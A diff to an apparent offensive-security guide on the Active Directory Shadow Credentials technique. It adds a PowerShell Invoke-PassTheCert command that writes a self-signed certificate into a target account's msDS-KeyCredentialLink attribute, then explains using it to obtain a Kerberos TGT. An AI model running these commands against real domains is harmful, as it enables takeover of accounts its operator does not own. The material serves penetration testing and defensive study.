@@ -74,8 +74,12 @@ Import-Module .\Invoke-PassTheCert.ps1
 $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
 # List all the available actions
 Invoke-PassTheCert -a -NoBanner
+
 # List the keys of a principal (not specifying -Object switch would list all targets with an msDs-KeyCredentialLink attribute)
-Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'ShadowCreds' -Object 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL' 
+Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'ShadowCreds' -Object 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL'
+
+# Populates the targeted account's 'msDS-KeyCredentialLink' attribute with a new self-signed certificate.
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -Target 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL'
 ```
 
 When the public key has been set in the `msDs-KeyCredentialLink` of the target, the certificate generated can be used with [Pass-the-Certificate](pass-the-certificate.md) to obtain a TGT and further access.
